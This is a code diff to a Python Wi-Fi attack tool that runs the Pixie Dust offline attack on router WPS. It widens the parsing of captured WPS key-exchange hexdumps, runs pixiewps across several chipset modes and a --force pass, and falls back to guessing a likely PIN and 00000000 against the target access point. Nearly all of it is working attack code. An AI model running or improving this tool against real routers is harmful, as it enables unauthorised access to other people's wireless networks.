@@ -4406,28 +4406,37 @@ def get_hex(line):
     Primary format (standard wpa_supplicant):
         WPS: <field_name> - hexdump(len=N): XX XX XX XX ...
 
-    Fallback formats handled (WPS 2.0 / alternative builds):
+    Fallback formats handled:
         WPS: <field>: AABBCCDD...         (compact, no spaces)
         WPS: <field> hexdump: AA BB CC    (no 'len=' prefix)
         <field>: AABBCCDD (plain)
-
-    Uses rfind(':') first (most reliable across formats) then falls back to
-    a regex scan for any long hex run in the line so that non-standard
-    wpa_supplicant builds don't silently drop critical fields.
     """
     try:
-        idx = line.rfind(':')
+        clean = line.strip().rstrip('\r\n')
+        # Strip trailing ASCII annotations e.g. " [ASCII: ...]" or "[...]"
+        clean = re.sub(r'\s*\[.*?\]\s*$', '', clean)
+
+        # Priority 1: Extract after 'hexdump...:'
+        if 'hexdump' in clean:
+            after = clean.split('hexdump', 1)[1]
+            if ':' in after:
+                raw_hex = re.sub(r'[^0-9A-Fa-f]', '', after.split(':', 1)[1]).upper()
+                if len(raw_hex) >= 8:
+                    return raw_hex
+
+        # Priority 2: Extract after the last colon in the line
+        idx = clean.rfind(':')
         if idx != -1:
-            hexdata = line[idx + 1:].replace(' ', '').upper()
-            if hexdata and all(c in '0123456789ABCDEF' for c in hexdata) and len(hexdata) >= 8:
-                return hexdata
-        # Fallback: regex scan -- find the longest run of hex pairs in the line.
-        # This handles compact ("AABBCC...") and colon-separated ("AA:BB:CC") formats.
-        candidates = re.findall(r'(?:[0-9A-Fa-f]{2}[: ]?){8,}', line)
+            raw_hex = re.sub(r'[^0-9A-Fa-f]', '', clean[idx + 1:]).upper()
+            if len(raw_hex) >= 8:
+                return raw_hex
+
+        # Priority 3: Fallback regex scan for longest hex run
+        candidates = re.findall(r'(?:[0-9A-Fa-f]{2}[\s:-]?){4,}', clean)
         if candidates:
             best = max(candidates, key=len)
-            cleaned = re.sub(r'[: ]', '', best).upper()
-            if all(c in '0123456789ABCDEF' for c in cleaned):
+            cleaned = re.sub(r'[^0-9A-Fa-f]', '', best).upper()
+            if len(cleaned) >= 8:
                 return cleaned
         return ''
     except Exception:
@@ -4541,8 +4550,7 @@ class PixiewpsData:
     def get_pixie_cmd(self, full_range=False, mode=None):
         """Build a pixiewps command string.
 
-        Only fields that are present (non-empty) are included in the argument
-        list to avoid errors with older versions of pixiewps.
+        Only valid pixiewps fields that are present (non-empty) are included.
         """
         parts = ['pixiewps']
         if self.pke:
@@ -4559,14 +4567,10 @@ class PixiewpsData:
             parts += ['--e-nonce', self.e_nonce]
         if self.r_nonce:
             parts += ['--r-nonce', self.r_nonce]
-        if self.r_hash1:
-            parts += ['--r-hash1', self.r_hash1]
-        if self.r_hash2:
-            parts += ['--r-hash2', self.r_hash2]
         if self.e_bssid:
-            parts += ['--bssid',   self.e_bssid]
+            parts += ['-b',        self.e_bssid]
         if mode is not None:
-            parts += ['--mode', str(mode)]
+            parts += ['--mode',    str(mode)]
         if full_range:
             parts.append('--force')
         return ' '.join(parts)
@@ -4947,7 +4951,7 @@ class Companion:
                 logger.debug('wpa_supplicant stderr: %s', line.rstrip())
                 sys.stderr.write(line + '\n')
 
-        if line.startswith('WPS: '):
+        if 'WPS: ' in line or line.startswith('WPS: ') or ('WPS' in line and 'hexdump' in line):
             if 'Building Message M' in line:
                 try:
                     raw = line.split('Building Message M')[1].strip()
@@ -5176,9 +5180,9 @@ class Companion:
                     ).encode('latin1').decode('utf-8', errors='replace')
                 except Exception:
                     self.connection_status.essid = ''
-            print(f'{info} Associating with AP…')
-        elif ('Associated with' in line) and (self.interface in line):
-            bssid = line.split()[-1].upper()
+        elif 'Associated with' in line:
+            m_bssid = re.search(r'([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}', line)
+            bssid = m_bssid.group(0).upper() if m_bssid else line.split()[-1].upper()
             if self.connection_status.essid:
                 print(ok + ' Associated with {} (ESSID: {}) '.format(bssid, self.connection_status.essid))
             else:
@@ -5237,50 +5241,61 @@ class Companion:
                     return raw[:7] + str(WPSpin.checksum(int(raw[:7])))
             return None
 
-        def _run_silent(cmd):
-            """Run pixiewps silently; return (stdout, might_vulnerable)."""
-            r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
-                               stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
-            out = r.stdout or ''
-            sl = out.lower()
-            might = 'might' in sl and 'vulnerable' in sl
-            return out, might
+        def _exec_cmd(cmd_str):
+            if showcmd:
+                print(f'{info} {cmd_str}')
+            r = subprocess.run(cmd_str, shell=True, stdout=subprocess.PIPE,
+                               stderr=subprocess.PIPE, encoding='utf-8', errors='replace')
+            combined = (r.stdout or '') + ('\n' + r.stderr if r.stderr else '')
+            return combined
 
+        # Pass 1: Standard Auto mode
         cmd = self.pixie_creds.get_pixie_cmd(full_range)
-        if showcmd:
-            print(cmd)
-        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
-                           stderr=sys.stdout, encoding='utf-8', errors='replace')
-        out_text = r.stdout or ''
-        if out_text.strip():
-            print(out_text)
+        out_text = _exec_cmd(cmd)
+        if out_text.strip() and not showcmd:
+            print(out_text.strip())
         pin = _extract_pin(out_text)
         if pin:
             return pin
 
-        # Detect "might be vulnerable" — AP needs --force (brute-force wider seed range).
-        # Auto-retry once with --force so the user doesn't have to know about this flag.
+        # Pass 2: Chipset-hinted mode if available
+        chipset_hint = _chipset_mode_hint(self._current_bssid)
+        if chipset_hint is not None:
+            chip_cmd = self.pixie_creds.get_pixie_cmd(full_range=full_range, mode=chipset_hint)
+            chip_out = _exec_cmd(chip_cmd)
+            pin = _extract_pin(chip_out)
+            if pin:
+                if chip_out.strip() and not showcmd:
+                    print(chip_out.strip())
+                return pin
+
+        # Pass 3: Multi-mode pass for standard chipset modes (3=Ralink, 1=RT/BCM, 2=eCos, 4=BCM, 5=Realtek/D-Link)
+        tried_modes = {chipset_hint} if chipset_hint is not None else set()
+        for mode in (3, 1, 2, 4, 5):
+            if mode in tried_modes:
+                continue
+            mode_cmd = self.pixie_creds.get_pixie_cmd(full_range=full_range, mode=mode)
+            mode_out = _exec_cmd(mode_cmd)
+            pin = _extract_pin(mode_out)
+            if pin:
+                if mode_out.strip() and not showcmd:
+                    print(mode_out.strip())
+                return pin
+            if 'might' in mode_out.lower() and 'vulnerable' in mode_out.lower():
+                out_text = mode_out
+
+        # Pass 4: Auto-retry with --force if output indicates target might be vulnerable
         stdout_lower = out_text.lower()
         might_vulnerable = ('might' in stdout_lower and 'vulnerable' in stdout_lower)
         if might_vulnerable and not full_range:
             print(f'{warn} AP /might be/ vulnerable — auto-retrying Pixiewps with --force …')
             force_cmd = self.pixie_creds.get_pixie_cmd(full_range=True)
-            print(f'{info} {force_cmd}')
-            r2 = subprocess.run(force_cmd, shell=True, stdout=subprocess.PIPE,
-                                stderr=sys.stdout, encoding='utf-8', errors='replace')
-            out_text2 = r2.stdout or ''
+            out_text2 = _exec_cmd(force_cmd)
             if out_text2.strip():
-                print(out_text2)
+                print(out_text2.strip())
             pin = _extract_pin(out_text2)
             if pin:
                 return pin
-            # Still no PIN — give the user the exact command to retry manually with fresh data
-            print(f'{warn} Operational Result: [-] WPS pin not found!')
-            print(f'{info} Note: This is an operational attack outcome (not a software bug):')
-            print(f'       - Not Vulnerable AP: Target router uses a secure PRNG (immune to offline Pixie Dust).')
-            print(f'       - Nonce Expiration / Timeout: WPS session timed out or nonces expired.')
-            print(f'{info} Manual retry command (paste after fresh data collection):')
-            print(f'    {force_cmd}')
 
         return False
 
@@ -5649,7 +5664,8 @@ class Companion:
             }
 
         elif pixiemode:
-            if self.pixie_creds.partial_ok():
+            has_critical = bool(self.pixie_creds.pke and self.pixie_creds.pkr and self.pixie_creds.e_hash1 and self.pixie_creds.e_hash2)
+            if self.pixie_creds.got_all() or has_critical:
                 pixiedust_pin = self.__runPixiewps(showpixiecmd, pixieforce)
                 if pixiedust_pin:
                     return self.single_connection(bssid, pin=pixiedust_pin, pixiemode=False,
@@ -5657,15 +5673,19 @@ class Companion:
                                                   output_file=output_file, freq_mhz=freq_mhz)
                 logger.warning('Pixie Dust attack operational result: Pixiewps returned no PIN for BSSID %s', bssid)
                 print(f'{warn} Operational Result: [-] WPS pin not found! / Pixie Dust failed.')
-                print(f'{info} Note: This is an operational attack outcome (not a software bug):')
-                print(f'       1. Not Vulnerable AP: Target router uses a secure PRNG (immune to offline attack).')
-                print(f'       2. Nonce Expiration / Timeout: Session timed out during exchange, or packet loss occurred.')
-                print(f'{info} Automatically falling back to Universal PIN generator and NULL PIN (00000000)…')
-                fallback_pins = self.generator.getSuggestedList(bssid) if bssid else []
-                if '00000000' not in fallback_pins:
+                print(f'{info} Note: Target router is likely immune to offline Pixie Dust (uses secure PRNG).')
+                print(f'{info} Automatically falling back to likely PIN and NULL PIN (00000000)…')
+                fallback_pins = []
+                likely = self.generator.getLikely(bssid) if bssid else None
+                if likely and likely != pin:
+                    fallback_pins.append(likely)
+                if '00000000' not in fallback_pins and pin != '00000000':
                     fallback_pins.append('00000000')
-                fallback_pins = [p for p in fallback_pins if p and p != pin]
+
                 for f_pin in fallback_pins:
+                    if self.connection_status.wps_locked:
+                        print(f'{warn} Target AP locked WPS — aborting fallback PIN attempts.')
+                        break
                     print(f'{info} Fallback: Trying PIN {f_pin}…')
                     logger.info('Pixie Dust fallback trying PIN %s for BSSID %s', f_pin, bssid)
                     res = self.single_connection(bssid=bssid, ssid=ssid, pin=f_pin, pixiemode=False,
@@ -5675,13 +5695,9 @@ class Companion:
                         return res
                 return False
             else:
-                missing = []
-                if not self.pixie_creds.pke:     missing.append('PKE (AP public key)')
-                if not self.pixie_creds.pkr:     missing.append('PKR (our public key)')
-                if not self.pixie_creds.e_nonce: missing.append('E-Nonce (AP nonce)')
-                if not self.pixie_creds.authkey: missing.append('AuthKey')
-                if not self.pixie_creds.e_hash1: missing.append('E-Hash1')
-                if not self.pixie_creds.e_hash2: missing.append('E-Hash2')
+                missing = self.pixie_creds.missing_critical()
+                if not missing:
+                    missing = ['PKE', 'PKR', 'E-Hash1/2']
                 last_m = self.connection_status.last_m_message
                 print(f'{err} Pixie Dust data incomplete — missing: {", ".join(missing)}')
                 if last_m < 4:
